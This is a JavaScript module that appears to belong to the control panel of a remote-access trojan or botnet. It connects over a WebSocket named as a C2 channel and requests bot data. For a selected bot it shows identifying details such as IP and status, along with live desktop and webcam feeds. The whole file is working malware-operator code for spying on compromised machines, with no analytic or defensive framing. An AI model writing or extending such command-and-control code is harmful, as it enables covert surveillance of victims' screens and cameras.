// js/modules/ui/connection.js
window.initControlConnection = () => {
    const login = localStorage.getItem('user_login');
    if (!login) return;

    const ws = new WebSocket(`ws://${location.hostname}:8001/ws?login=${encodeURIComponent(login)}`);
    ws.binaryType = 'arraybuffer';
    window.c2WebSocket = ws;

    ws.onopen = () => window.requestBotData();
    ws.onmessage = ({ data }) => {
        const pkg = parseBinaryMessage(data);
        if (pkg?.id === AppState.clientId) {
            if (pkg.mod === 'DataScribe') handleDataScribe(pkg.payload, pkg.id);
            if (pkg.mod === 'Desktop') window.updateDesktopFeed?.(pkg.payload);
            if (pkg.mod === 'Webcam') window.updateWebcamFeed?.(pkg.payload);
        }
    };
};

function handleDataScribe(payload, botId) {
    try {
        const json = JSON.parse(dec.decode(payload));
        const map = { clientId: botId, clientIp: json.ip, clientStatus: json.status, clientLastActive: json.last_active };

        Object.entries(map).forEach(([id, val]) => {
            const el = document.getElementById(id);
            if (el && val !== undefined) {
                el.textContent = val;
                if (id === 'clientStatus') el.className = `value status-${val}`;
            }
        });
        AppState.info = { ...AppState.info, ...json, id: botId };
    } catch (e) {}
}